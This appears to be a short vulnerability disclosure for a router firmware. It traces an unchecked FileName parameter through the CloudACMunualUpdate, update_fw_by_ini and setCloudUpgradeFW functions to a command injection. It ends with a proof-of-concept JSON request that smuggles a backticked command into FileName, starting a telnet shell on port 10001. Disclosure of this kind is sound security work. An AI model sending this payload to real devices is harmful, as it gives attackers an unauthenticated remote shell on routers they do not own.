...
In `CloudACMunualUpdate` function,`FileName` is directly passed by the attacker, so we can control the `FileName` to attack the OS.

<div  align="center"><img src="./images/1.png" style="zoom:80%;" /></div>

In `update_fw_by_ini` function, call the function `setCloudUpgradeFW`.

<div  align="center"><img src="./images/2.png" style="zoom:80%;" /></div>

In `setCloudUpgradeFW` function, the initial input has not checked and cause command injection.
...
We set `FileName` as **`telnetd -l /bin/sh -p 10001`** , and the router will excute it,such as:
...
{"topicurl":"setting/CloudACMunualUpdate","FileName":"`telnetd -l /bin/sh -p 10001`"}
```
